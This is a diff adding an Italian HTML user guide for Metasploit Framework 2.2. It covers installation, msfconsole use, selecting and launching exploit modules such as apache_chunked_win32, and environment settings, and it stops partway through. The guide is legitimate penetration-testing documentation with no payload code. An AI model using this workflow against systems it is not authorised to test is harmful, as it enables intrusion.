@@ -1,0 +1,1164 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<HEAD>
+	<META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=iso-8859-1">
+	<TITLE></TITLE>
+	<META NAME="GENERATOR" CONTENT="OpenOffice.org 1.1.3  (Linux)">
+	<META NAME="CREATED" CONTENT="19951121;10410000">
+	<META NAME="CHANGED" CONTENT="20041109;11363400">
+	<STYLE>
+	<!--
+		@page { size: 8.5in 11in; margin-right: 1.25in; margin-top: 1in; margin-bottom: 1in }
+		P { margin-bottom: 0.08in; direction: ltr; color: #000000; text-align: left; widows: 0; orphans: 0 }
+		P.western { font-family: "Times New Roman", serif; font-size: 12pt; so-language: en-US }
+		P.cjk { font-family: "Lucida Sans Unicode", sans-serif; font-size: 12pt }
+		P.ctl { font-family: "Times New Roman", serif; font-size: 10pt; so-language: ar-SA }
+		P.list-western { font-family: "Times New Roman", serif; font-size: 12pt; so-language: en-US }
+		P.list-cjk { font-family: "Lucida Sans Unicode", sans-serif; font-size: 12pt }
+		P.list-ctl { font-family: "Times New Roman", serif; font-size: 10pt; so-language: ar-SA }
+		H1 { margin-top: 0in; margin-bottom: 0in; direction: ltr; color: #000000; text-align: left; widows: 0; orphans: 0 }
+		H1.western { font-family: "Times New Roman", serif; font-size: 12pt; so-language: en-US }
+		H1.cjk { font-family: "Lucida Sans Unicode", sans-serif; font-size: 12pt }
+		H1.ctl { font-family: "Times New Roman", serif; font-size: 10pt; so-language: ar-SA; font-weight: medium }
+		P.ww-table-contents-western { font-family: "Times New Roman", serif; font-size: 12pt; so-language: en-US }
+		P.ww-table-contents-cjk { font-family: "Lucida Sans Unicode", sans-serif; font-size: 12pt }
+		P.ww-table-contents-ctl { font-family: "Times New Roman", serif; font-size: 10pt; so-language: ar-SA }
+	-->
+	</STYLE>
+</HEAD>
+<BODY LANG="it-IT" TEXT="#000000" DIR="LTR">
+<P LANG="en-US" CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in">
+<BR>
+</P>
+<P CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><FONT SIZE=5 STYLE="font-size: 20pt"><B>Metasploit
+Framework Version 2.2</B></FONT></FONT></P>
+<P LANG="en-US" CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in">
+<B><SPAN LANG="it-IT"><FONT SIZE=5><FONT FACE="Arial, sans-serif">Corso
+<I>Crash</I> per Utenti</FONT></FONT></SPAN></B></P>
+<P CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
+</P>
+<P CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
+</P>
+<P CLASS="western" ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
+</P>
+<DIV ID="Section1" DIR="LTR">
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Introduzione</B></FONT></FONT></P>
+	<P CLASS="list-western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questo
+	documento vuole essere una sorta di guida per l&rsquo;utente alla
+	versione 2.2 del Metasploit Framework (letteralmente <I>framework</I>
+	vuole dire <I>struttura</I> N.d.T.). Lo scopo e&rsquo; di fornire
+	nozioni basilari su cosa e&rsquo; il Framework, come funziona e cosa
+	ci si puo&rsquo; fare. Come per molti altri software <I>open-source</I>,
+	una corretta documentazione accompagna l&rsquo;attuale sviluppo del
+	progetto. Se si possiedono ottime doti tecniche e redazionali e si
+	intende contribuire al Framework, e&rsquo; possibile contattare gli
+	autori e sviluppatori all&rsquo;indirizzo email riportato in fondo a
+	questo documento.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Metasploit
+	Framework e&rsquo; un ambiente completo per scrivere, testare e
+	usare codici <I>exploit. </I>Fornisce una solida piattaforma per
+	<I>penetration testing</I>, sviluppo di <I>shellcode</I> e ricerca
+	di vulnerabilita&rsquo;. La maggior parte di Framework e&rsquo;
+	composta di codice Perl <I>orientato all&rsquo;oggetto</I> con
+	componenti aggiuntivi scritti in C, Assembler e Python.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Al
+	momento ci sono 2 sviluppatori del <I>core</I>, 2 importanti
+	collaboratori e un nutrito gruppo di persone che ha fornito idee o
+	codici che sono stati poi inseriti nel progetto per la loro
+	validita&rsquo;. Per una lista completa dei partecipanti al progetto
+	si prega di far riferimento all&rsquo;apposito <I>modulo exploit dei
+	Crediti</I>.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in; page-break-before: always">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Installazione</B></FONT></FONT></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Installazione
+	sotto Unix</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Installare
+	il Framework e&rsquo; facile come estrarre un file compresso
+	<I>tarball</I>; basta portarsi dentro la directory creata ed
+	eseguire la vostra interfaccia utente preferita. E&rsquo; caldamente
+	raccomandato di compilare ed installare il modulo Perl
+	<I>Term::ReadLine::Gnu </I>che si trova nella sottodirectory
+	chiamata &ldquo;extras&rdquo;. Questo pacchetto abilita il
+	completamento tramite bottone TAB nell&rsquo;interfaccia <I>msfconsole</I>
+	che e&rsquo; l&rsquo;interfaccia utente preferibile per l&rsquo;utilizzo
+	quotidiano. Se si desidera un supporto SSL, installare il modulo
+	Perl <I>Net::SSLeay </I>che si trova sempre dentro &ldquo;extras&rdquo;.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Per
+	effettuare un&rsquo;installazione su grossi sistemi, raccomandiamo
+	di copiare l&rsquo;intera directory di Framework in una locazione
+	accessibile a tutti (/usr/local/msf) e quindi di creare <I>link
+	simbolici</I> dalle applicazioni msf* a una directory nel percorso
+	di sistema (/usr/local/bin). I moduli specifici dell&rsquo;utente
+	possono essere inseriti dentro alla directory $HOME/.msf/&lt;TYPE&gt;,
+	dove TYPE e&rsquo; uno degli exploits, dei <I>payloads</I>, dei <I>nops</I>
+	o degli <I>encoders</I>.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Installazione
+	sotto Windows</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Dopo
+	mesi di lavoro sui <I>bug</I> di ActiveState, abbiamo deciso di
+	abbandonarlo e di supportare solamente Cygwin Perl. L&rsquo;installer
+	per Win32 di Metasploit Framework comprende una spoglia copia
+	dell&rsquo;ambiente Cygwin che e&rsquo; risultato essere il modo
+	migliore per usare il Framework su piattaforme Windows. Se si
+	desidera installare Framework su un ambiente Cygwin gia&rsquo;
+	esistente, fare riferimento al file &ldquo;docs/QUICKSTART.cygwin&rdquo;
+	nella directory di installazione; ci sono alcune questioni riguardo
+	l&rsquo;installazione dei moduli <I>Term::ReadLine::Gnu</I></FONT> <FONT FACE="Arial, sans-serif">e
+	<I>Net::SSLeay</I> che richiedono salti mortali per essere risolti.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Avvertimenti
+	sulle Piattaforme</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Nonostante
+	abbiamo cercato di supportare il maggior numero di piattaforme, sono
+	stati riscontrati alcuni problemi di compatibilita&rsquo;. Se
+	pensate di accedere all&rsquo;interfaccia di msfweb da un sistema
+	MacOS X, sappiate che Internet Explorer manifestera&rsquo; problemi
+	nell&rsquo;ultima parte del processo di <I>exploit</I>. Questi
+	inconvenienti sono dovuti al fatto che Internet Explorer non riesce
+	a mostrare l&rsquo;<I>output</I> incrementale dal server HTTP 1.0.
+	Il supporto ai <I>raw socket</I> e&rsquo; considerato
+	non-funzionante per Cygwin, AIX, HPUX and probabilmente anche
+	Solaris. Infatti la capacita&rsquo; di <I>spoofare</I> pacchetti UDP
+	durante un attacco usando la variabile d&rsquo;ambiente Udpsourcelp
+	potrebbe risultare inefficace. Gli utenti Windows potrebbero
+	incontrare problemi durante l&rsquo;utilizzo dell&rsquo;installer
+	Win32 su sitemi che presentano una vecchia versione del file Cygwin
+	gia&rsquo; installata.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<H1 CLASS="western"><FONT FACE="Arial, sans-serif">Sistemi Operativi
+	Supportati</FONT></H1>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Il
+	Framework dovrebbe funzionare su quasi tutti I sistemi operativi
+	basati su Unix, che comprendano una completa e aggiornata versione
+	dell&rsquo;interprete Perl (5.6+). Ogni versione stabile del
+	Framework e&rsquo; testata sulle quattro piattaforme primarie.</FONT></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<UL>
+		<LI><P LANG="fr-FR" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Linux
+		(x86, ppc) (2.4, 2.6)</FONT></P>
+		<LI><P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Windows
+		NT (4.0, 2000, XP, 2003)</FONT></P>
+		<LI><P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">BSD
+		(Open 3.x, Free 4.6+)</FONT></P>
+		<LI><P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">MacOS
+		X (10.3.3)</FONT></P>
+	</UL>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Sono
+	stati riscontrati problemi nelle seguenti piattaforme::</FONT></P>
+	<UL>
+		<LI><P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Windows
+		9x (95, 98, ME)</FONT></P>
+		<LI><P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">HP-UX
+		11i (requires Perl upgrade)</FONT></P>
+	</UL>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Abbiamo
+	ricevuto numerose segnalazioni che il Framework funziona bene su
+	Solaris, AIX e persino su Sharp Zaurus (basato su Linux). Questi
+	sistemi richiedono spesso un aggiornamento del Perl unitamente con
+	le utilita&rsquo; <I>GNU</I>, per poter funzionare correttamente.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<H1 CLASS="western"><FONT FACE="Arial, sans-serif">Aggiornamento del
+	Framework</FONT></H1>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">A
+	partire dalla versione 2.2, il Framework include l&rsquo;utilita&rsquo;
+	di aggiornamento online denominata <I>msfupdate</I>. Questo script
+	puo&rsquo; essere usato per scaricare e installare l&rsquo;ultima
+	versione aggiornata del Framework direttamente dal sito
+	metasploit.com. L&rsquo;utilita&rsquo; esegue un aggiornamento
+	&ldquo;per-file&rdquo;, confrontando il <I>checksum</I> del file
+	locale con quelli disponibili dal sito internet. Questo procedimento
+	avviene attraverso una connessione SSL validata, presupponendo che
+	il modulo <I>Net::SSLeay</I> sia installato. Questa procedura non e&rsquo;
+	completamente priva di rischi d&rsquo;errore e dipende ancora dalla
+	sicurezza del server web di metasploit.com. Per saperne di piu&rsquo;
+	sul msfupdate basta eseguirlo con l&rsquo;opzione &ndash;h.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Se
+	non si vuole utilizzare il sistema di aggiornamento online e&rsquo;
+	possibile scaricare i moduli aggiornati dal sito web di
+	metasploit.com. Prossimamente verra&rsquo; sviluppata un&rsquo;interfaccia
+	grafica per scaricare l&rsquo;ultimo aggiornamento stabile. </FONT>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in; page-break-before: always">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Per iniziare</B></FONT></FONT></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><B>L&rsquo;Interfaccia
+	della Console</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Dopo
+	aver installato il Framework, bisogna verificare che tutto funzioni
+	correttamente. Il modo piu&rsquo; veloce per fare cio&rsquo;
+	consiste nell&rsquo;eseguire l&rsquo;interfaccia utente <I>msfconsole</I>.
+	Questa dovrebbe mostrare il logo Metasploit in ASCII, mostra la
+	versione corrente del framework, il numero di <I>payloads</I>, il
+	numero di <I>exploits</I> e successivamente dovrebbe aprire una
+	finestra di console &ldquo;msf&rdquo;. Da qui&rsquo;, digitare <B>help</B>
+	per avere la lista dei comandi disponibili. Il <I>modo</I> corrente
+	e&rsquo; settato su &ldquo;main&rdquo;; questo vi permette di
+	visualizzare gli <I>exploits</I> ed i <I>payloads</I> e vi consente
+	inoltre di configurare le opzioni generali. Per avere la lista di
+	tutti gli <I>exploits</I> disponibili digitare <B>show exploits. </B>Per
+	avere maggiori informazioni circa un determinato exploit digitare
+	<B>info nome_del_modulo</B>.</FONT></SPAN></P>
+	<P CLASS="list-western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><B>Efficienza
+	della console</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">La
+	console e&rsquo; stata pensata per essere estremamente efficiente e
+	puo&rsquo; essere usata come standard <I>shell</I> in molte
+	situazioni. Se viene inserito un comando sconosciuto, la console
+	cerchera&rsquo; all&rsquo;interno del sistema per determinare se si
+	tratti di comandi esterni al Framework. Se trova una corrispondenza,
+	viene eseguito il comando esterno con le proprie opzioni. Questo
+	permettera&rsquo; di usare il set di programmi/comandi
+	personalizzato senza dover uscire dalla console. </FONT></SPAN>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	completamento automatico tramite TAB si basa sulla ricerca per
+	confronto dei  nomi dei file, se il comando inserito non e&rsquo; di
+	quelli interni alla console. Cio&rsquo; permette di navigare il File
+	System normalmente, come si fa usando una <I>shell bash</I>.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><B>Selezionare
+	un exploit</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">E&rsquo;
+	possibile selezionare una <I>exploit</I> dalla finestra di msf
+	digitando il comando <B>use</B>. A questo seguira&rsquo; come
+	secondo argomento, il nome del modulo <I>exploit</I> che si intende
+	utilizzare. Successivamente bisogna <I>settare</I> il <I>modo
+	</I>dell&rsquo;<I>exploit</I> e caricare l&rsquo;ambiente Temporaneo
+	per quell&rsquo;<I>exploit</I>. E&rsquo; possibile passare da un
+	<I>exploit </I>attivo all&rsquo;altro con il comando <B>use</B>
+	oppure tornare alla <I>shell</I> principale con il comando <B>back</B>.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif"><B>Basi
+	di Exploits</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Dopo
+	aver selezionato <I>l&rsquo;exploit</I>, la scelta dei comandi
+	cambia. Digitare il comando <B>help</B> per avere un&rsquo;idea dei
+	comandi disponibili. Il comando <B>show</B> richiede argomenti
+	diversi che permettono di visualizzare le opzioni standard, quelle
+	avanzate,gli <I>obbiettivi</I> dell&rsquo;<I>exploit</I> e i <I>payload</I>
+	compatibili.Il comando <B>check</B> controlla il bersaglio mentre il
+	comando <B>exploit</B> lancia l&rsquo;<I>exploit </I>selezionato.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in; page-break-before: always">
+	<B><SPAN LANG="it-IT"><FONT SIZE=5><FONT FACE="Arial, sans-serif">Ambienti</FONT></FONT></SPAN></B></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	sistema ambiente e&rsquo; una componente fondamentale del Framework;
+	l&rsquo;interfaccia se ne serve per configurare diverse opzioni, il
+	<I>payload</I> lo usa per <I>patchare</I> gli <I>opcodes</I>, gli
+	<I>exploits</I> lo usano per definire i parametri e viene inoltre
+	utilizzato internamente dai moduli per passarsi le opzioni. Il
+	sistema ambiente e&rsquo; diviso logicamente in Globale e
+	Temporaneo.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif"><FONT COLOR="#000000">Ogni
+	<I>exploit</I> conserva il proprio Ambiente Temporaneo, che va a
+	sovrascrivere l&rsquo;Ambiente Globale. Quando si seleziona un
+	<I>exploit</I> tramite il comando <B>use</B>, l&rsquo;ambiente
+	temporaneo per quell&rsquo;exploit viene caricato e il precedente
+	viene salvato prima di essere chiuso. Quindi se si ritorna
+	all&rsquo;exploit precedente ecco che l&rsquo;ambiente temporaneo
+	per quell&rsquo;exploit viene caricato nuovamente.</FONT></FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Ambiente
+	Globale</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Per
+	accedere all&rsquo;ambiente Globale dalla console bisogna digitare I
+	comandi <B>setg </B>e <B>unsetg</B>. L&rsquo;esempio che segue
+	mostra lo stato dell&rsquo;ambiente Globale appena dopo una recente
+	installazione. Digitando <B>setg</B> senza argomenti si otterra&rsquo;
+	lo stato attuale dell&rsquo;ambiente globale mentre digitando <B>unsetg</B>
+	senza argomenti si avra&rsquo; la completa &ldquo;pulizia&rdquo;
+	dell&rsquo;ambiente globale. Le impostazioni base verranno quindi
+	caricate al primo avvio dell&rsquo;interfaccia.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<BR><BR>
+	</P>
+	<P LANG="fr-FR" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>+ -- --=[ msfconsole
+	v2.2 [34 exploits - 33 payloads]</FONT></FONT></P>
+	<P LANG="fr-FR" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<BR><BR>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><SPAN LANG="de-DE"><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>setg</B></FONT></SPAN></FONT></FONT></P>
+	<P LANG="de-DE" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>AlternateExit: 2</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>DebugLevel: 0</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>Logging: 0</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>msf &gt; </FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	      
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>Ambiente
+	Temporaneo</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Per
+	accedere all&rsquo;ambiente temporaneo, digitare I comandi <B>set</B>
+	e <B>unset</B>. Questo ambiente viene applicato solamente al modulo
+	<I>exploit</I> correntemente caricato. Ovviamente passando ad un
+	altro <I>exploit</I> tramite il comando <B>use</B> cambiera&rsquo;
+	anche l&rsquo;ambiente temporaneo caricato. Se nessun modulo <I>exploit</I>
+	e&rsquo; caricato, i comandi <B>set</B> e <B>unset</B> non sono
+	disponibili.Gli ambienti temporanei inattivi vengono mantenuti in
+	memoria e attivati una volta che il modulo a loro associato viene
+	caricato. Il seguente esempio mostra come il comando <B>use
+	</B>seleziona l&rsquo;<I>exploit</I> e come il comando <B>back</B>
+	riporti indietro alla console principale.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>use apache_chunked_win32 </B></FONT></FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	apache_chunked_win32 &gt; <B>set</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	apache_chunked_win32 &gt; <B>set FOO BAR</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>FOO -&gt; BAR</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	apache_chunked_win32 &gt; <B>set</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>FOO: BAR</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	apache_chunked_win32 &gt; <B>back</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>use poptop_negative_read</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	poptop_negative_read &gt; <B>set</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	poptop_negative_read &gt; <B>back</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>use apache_chunked_win32</B> </FONT></FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	apache_chunked_win32 &gt; <B>set</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>FOO: BAR</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>msf apache_chunked_win32
+	&gt; </FONT></FONT>
+	</P>
